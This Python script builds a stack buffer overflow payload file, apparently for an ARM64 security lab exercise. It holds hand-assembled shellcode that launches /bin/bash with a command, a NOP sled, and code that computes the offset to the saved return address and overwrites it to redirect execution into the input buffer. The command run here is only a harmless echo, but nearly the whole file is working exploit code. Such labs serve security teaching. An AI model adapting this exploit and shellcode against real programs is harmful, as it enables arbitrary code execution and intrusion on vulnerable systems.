#!/usr/bin/python3
import sys

# Shellcode (same as all other tasks)
shellcode = (
    "\x0b\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
    "\x28\x01\x80\xd2\x69\x6a\x28\x38\x88\x01\x80\xd2\x69\x6a\x28\x38"
    "\xe8\x09\x80\xd2\x69\x6a\x28\x38\x08\x0a\x80\xd2\xe9\x03\x13\xaa"
    "\x69\x6a\x28\xf8\x08\x0b\x80\xd2\x49\x01\x80\xd2\xe9\x03\x09\xcb"
    "\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0c\x80\xd2\x09\x02\x80\xd2"
    "\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0d\x80\xd2"
    "\x29\x01\x09\xca\x69\x6a\x28\xf8\xe0\x03\x13\xaa\x61\x42\x01\xb1"
    "\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    "/bin/bash*"
    "-c****"
    "echo '(^_^) SUCCESS SUCCESS (^_^)'                             *"
    "AAAAAAAA"
    "BBBBBBBB"
    "CCCCCCCC"
    "DDDDDDDD"
).encode('latin-1')

# Fill with NOPs (0xD503201F is NOP instruction in ARM64)
nop = (0xD503201F).to_bytes(4, byteorder='little')
content = bytearray(517)
for offset in range(int(517/4)):
    content[offset*4:offset*4 + 4] = nop

##################################################################
buffer_addr = 0x0000fffffffff320       # ✩ Need to change ✩
foo_frame_pointer = 0x0000fffffffff340 # ✩ Need to change ✩

# KEY INSIGHT: strcpy only copies 46 bytes to bof's buffer,
# BUT the full 517-byte input buffer (with complete shellcode)
# still exists in main's stack frame!
# Solution: Return to the 517-byte input buffer, not bof's buffer

# Place shellcode at offset 0 of payload
content[0:len(shellcode)] = shellcode

offset_to_ret = (foo_frame_pointer + 8) - buffer_addr

# Estimate where the 517-byte input buffer is in main's frame
# It's typically 200-600 bytes above bof's buffer
input_buffer_offset = 0x200  # ✩ Adjust this if needed ✩

# Return to the 517-byte input buffer where complete shellcode lives
ret = buffer_addr + input_buffer_offset

if offset_to_ret < 0 or offset_to_ret + 8 > len(content):
    print(f"Error: Invalid offset {offset_to_ret}")
    sys.exit(1)

# strcpy will partially write this address (6 bytes before hitting null)
content[offset_to_ret:offset_to_ret + 8] = ret.to_bytes(8, byteorder='little')

print(f"Buffer: {hex(buffer_addr)}")
print(f"Returning to: {hex(ret)} (estimate of 517-byte input buffer)")
print(f"Try adjusting input_buffer_offset if this doesn't work")
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
